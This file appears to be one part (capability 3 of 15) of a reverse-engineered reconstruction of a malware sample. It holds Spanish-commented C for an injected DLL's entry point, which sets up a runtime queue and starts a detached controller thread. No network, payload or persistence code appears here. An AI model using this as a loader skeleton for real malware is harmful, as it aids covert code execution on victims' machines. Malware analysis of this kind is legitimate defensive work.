/* ============================================================
 * Capacidad 03/15 — Inicialización y creación de controlador
 * Función C : MalwareDllMain
 * Dirección : 0x18001bf79   · Nodo N2   · Confianza: Alta
 * ------------------------------------------------------------
 * Punto de entrada de la DLL inyectada. El wrapper 0x180067ba0
 * (DllStartupWrapper) alcanza DllMain en 0x18001bf79, que evita las
 * notificaciones de hilo y arranca un hilo maestro (controlador)
 * desligado. No se observa mecanismo de persistencia en esta cadena.
 * ============================================================
 */

#include "00_tipos_comunes.h"

/* Estado de vida global de los workers (usado por CAP 4 y CAP 8). */
volatile bool g_worker_running = false;

/* ------------------------------------------------------------------
 * Crea el contexto de ejecución: cola concurrente + configuración
 * vacía + endpoint de red. Se inicializa la exclusión mutua y la
 * señal de la cola.
 * ------------------------------------------------------------------ */
RuntimeContext *CreateRuntimeContext(void)
{
    RuntimeContext *ctx = (RuntimeContext *)HeapAlloc(GetProcessHeap(),
                                                      HEAP_ZERO_MEMORY,
                                                      sizeof(RuntimeContext));
    if (ctx == NULL)
        return NULL;

    InitializeCriticalSection(&ctx->queue.lock);
    InitializeConditionVariable(&ctx->queue.signal);
    ctx->running        = false;
    ctx->cfg.task_flags = 0;
    return ctx;
}

/* ------------------------------------------------------------------
 * Libera el contexto y los recursos asociados (cola y buffers).
 * ------------------------------------------------------------------ */
void DestroyRuntimeContext(RuntimeContext *ctx)
{
    if (ctx == NULL)
        return;

    EnterCriticalSection(&ctx->queue.lock);
    for (size_t i = 0; i < ctx->queue.count; i++) {
        if (ctx->queue.items[i].payload.data != NULL)
            HeapFree(GetProcessHeap(), 0, ctx->queue.items[i].payload.data);
    }
    if (ctx->queue.items != NULL)
        HeapFree(GetProcessHeap(), 0, ctx->queue.items);
    LeaveCriticalSection(&ctx->queue.lock);

    DeleteCriticalSection(&ctx->queue.lock);
    HeapFree(GetProcessHeap(), 0, ctx);
}

/* ------------------------------------------------------------------
 * Arranca un worker desligado (hilo maestro / controlador) y devuelve
 * TRUE si el hilo se creó. El hilo no es esperado por nadie.
 * ------------------------------------------------------------------ */
bool StartDetachedWorker(LPTHREAD_START_ROUTINE routine, RuntimeContext *ctx)
{
    if (routine == NULL || ctx == NULL)
        return false;

    ctx->running        = true;
    g_worker_running    = true;

    HANDLE thread = CreateThread(NULL, 0, routine, ctx, 0, NULL);
    if (thread == NULL) {
        ctx->running        = false;
        g_worker_running    = false;
        return false;
    }
    CloseHandle(thread);      /* desligado: no se conserva el handle */
    return true;
}

/* ------------------------------------------------------------------
 * Wrapper de arranque (0x180067ba0) -> MalwareDllMain (0x18001bf79)
 * [confirmado]. Solo actúa sobre DLL_PROCESS_ATTACH.
 * ------------------------------------------------------------------ */
BOOL APIENTRY MalwareDllMain(HMODULE module, DWORD reason, void *reserved)
{
    (void)reserved;
    if (reason != DLL_PROCESS_ATTACH)
        return TRUE;

    DisableThreadLibraryCalls(module);      /* silencia notificaciones de hilo */

    RuntimeContext *ctx = CreateRuntimeContext();      /* cola + contexto de red */
    if (ctx == NULL)
        return FALSE;

    return StartDetachedWorker((LPTHREAD_START_ROUTINE)ControllerMain, ctx);
}
